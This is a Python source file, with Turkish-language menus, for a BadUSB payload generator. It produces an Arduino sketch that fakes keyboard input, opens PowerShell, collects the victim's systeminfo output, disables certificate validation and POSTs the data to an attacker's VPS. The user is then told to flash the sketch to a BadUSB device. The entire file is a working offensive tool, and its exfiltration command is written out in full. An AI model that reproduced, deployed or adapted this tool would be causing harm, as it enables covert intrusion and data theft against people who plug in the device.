class BadUSBGenerator:
    @staticmethod
    def generate_payload(vps_ip):
        return f"""#include <Keyboard.h>

void typeCommandSlowly(String command, int delayMs = 50) {{
  for (int i = 0; i < command.length(); i++) {{
    Keyboard.print(command.charAt(i));
    delay(delayMs);
  }}
}}

void setup() {{
  Keyboard.begin();
  delay(2000); 
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("powershell");
  delay(300);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1500);

  String command = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; "
                   "$systemInfo = systeminfo | Out-String; "
                   "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{ $true }}; "
                   "try {{ "
                   "$response = Invoke-WebRequest -Uri 'https://{vps_ip}/sendoutput' -Method POST -Body $systemInfo -ContentType 'text/plain'; "
                   "Write-Host \\"Bilgi gonderildi. Sunucu yaniti: $($response.Content)\\" "
                   "}} catch {{ Write-Host \\"Hata olustu: $_\\" }}; "
                   "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null";

  typeCommandSlowly(command, 50);
  delay(500);

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  Keyboard.end();
}}

void loop() {{
}}"""

    @staticmethod
    def run():
        print("\n[+] BadUSB Payload Generator")
        print("1. Get SystemInfo (VPS Sunucu Gereklidir)")
        print("2. Geri Dön")
        choice = input("Seçiminiz: ")
    
        if choice == '1':
            vps_ip = input("VPS IP adresini girin: ").strip()
    
            if not all(part.isdigit() and 0 <= int(part) <= 255 for part in vps_ip.split('.')):
                print("[-] Geçersiz IP adres formatı!")
                return
    
            payload = BadUSBGenerator.generate_payload(vps_ip)
            filename = f"badusb_systeminfo_{vps_ip.replace('.', '_')}.ino"
            
            try:
                with open(filename, 'w') as f:
                    f.write(payload)
                print(f"[+] Payload başarıyla kaydedildi: {os.path.abspath(filename)}")
                print("[!] Önemli: Yapmanız gerekenler:")
                print("1. VPS'inizde verileri alacak bir web sunucusu kurun")
                print("2. Bu .ino dosyasını Arduino BadUSB cihazınıza yükleyin")
            except Exception as e:
                print(f"[-] Dosya kaydedilirken hata oluştu: {e}")
    
        elif choice != '2':
            print("[-] Geçersiz seçim!")